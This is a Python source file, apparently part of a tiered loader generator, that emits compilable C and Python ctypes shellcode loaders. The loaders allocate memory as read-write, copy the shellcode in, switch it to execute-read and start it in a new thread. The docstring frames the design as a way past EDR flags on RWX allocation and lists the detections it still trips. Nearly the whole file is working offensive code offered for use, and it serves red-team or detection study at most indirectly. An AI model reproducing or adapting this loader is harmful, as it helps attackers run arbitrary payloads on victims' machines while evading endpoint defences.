"""Loader: win_rw_rx — VirtualAlloc(RW) → memcpy → VirtualProtect(RX) → CreateThread.

Tier 2. Removes the most-flagged indicator: RWX allocation.
Two-stage permission model:
  1. Allocate as RW (unremarkable; used constantly by legitimate code)
  2. Write shellcode
  3. Flip to RX via VirtualProtect (no write permission during execution)
  4. Execute via CreateThread

Still triggers on:
  - VirtualProtect(RX) on a non-image-backed region (flagged by many EDR)
  - CreateThread from non-image-backed page
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_rw_rx")

_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>

{sc_array}

int main(void) {{
    LPVOID mem = VirtualAlloc(NULL, sc_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) {{
        fprintf(stderr, "[-] VirtualAlloc failed: %lu\\n", GetLastError());
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    DWORD old_protect;
    if (!VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old_protect)) {{
        fprintf(stderr, "[-] VirtualProtect failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    if (!hThread) {{
        fprintf(stderr, "[-] CreateThread failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import sys

{sc_bytes}

kernel32 = ctypes.windll.kernel32

mem = kernel32.VirtualAlloc(None, len(sc),
                            0x3000,   # MEM_COMMIT | MEM_RESERVE
                            0x04)     # PAGE_READWRITE
if not mem:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(sc))

old = ctypes.c_ulong(0)
if not kernel32.VirtualProtect(ctypes.c_void_p(mem), len(sc),
                                0x20,            # PAGE_EXECUTE_READ
                                ctypes.byref(old)):
    sys.exit(1)

ht = kernel32.CreateThread(None, 0, ctypes.c_void_p(mem), None, 0, None)
if not ht:
    sys.exit(1)
kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 0xFFFFFFFF)
"""


def generate_c(shellcode: bytes) -> str:
    """Return a compilable C loader using VirtualAlloc(RW) → VirtualProtect(RX) → CreateThread."""
    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))


def generate_python(shellcode: bytes) -> str:
    """Return a Python ctypes loader using VirtualAlloc(RW) → VirtualProtect(RX) → CreateThread."""
    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
